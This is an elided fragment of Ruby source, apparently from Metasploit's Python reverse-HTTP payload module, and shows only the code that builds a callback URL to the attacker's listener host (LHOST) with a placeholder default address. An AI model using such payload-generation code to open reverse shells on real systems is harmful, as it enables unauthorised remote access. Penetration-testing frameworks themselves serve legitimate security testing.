...
module Msf
  module Payload::Python::ReverseHttp
    ...
    #
    def generate(opts = {})
      opts.merge!(host:       datastore['LHOST'] || '127.127.127.127',
    ...
    def generate_callback_url(opts)
      # required opts:
      #   host, port, scheme
      target_url = if Rex::Socket.is_ipv6?(opts[:host])
                     "#{opts[:scheme]}://[#{opts[:host]}]"
                   else
                     "#{opts[:scheme]}://#{opts[:host]}"
                   end
    ...
    def generate_callback_uri(opts = {})
      ...
      uri_req_len = 5 if available_space.nil? || required_space > available_space
